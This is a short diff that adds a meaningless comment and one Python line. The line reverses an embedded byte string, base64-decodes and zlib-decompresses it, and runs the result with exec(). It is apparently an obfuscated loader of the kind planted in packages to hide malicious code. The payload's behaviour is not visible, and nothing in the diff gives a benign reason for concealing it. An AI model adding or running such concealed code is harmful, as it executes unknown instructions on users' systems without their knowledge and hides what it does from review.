@@ -1,0 +1,2 @@
+# edtrafc
+_ = lambda __ : __import__('zlib').decompress(__import__('base64').b64decode(__[::-1]));exec((_)(b'==g3tQABdorNRTnuGQ4sOG/f1NT2ADt2SKs2PqI4q4+b4p6S7EZeGEk5qGSJJas3BOv4awfyY2+nXmqWzyR1ZBnd21ofwqFbev9yhmIVP+WVMInNkk1EKUYka2NLOZ4AyloWbh/p9CdBMAzgOEzyVxJe'))
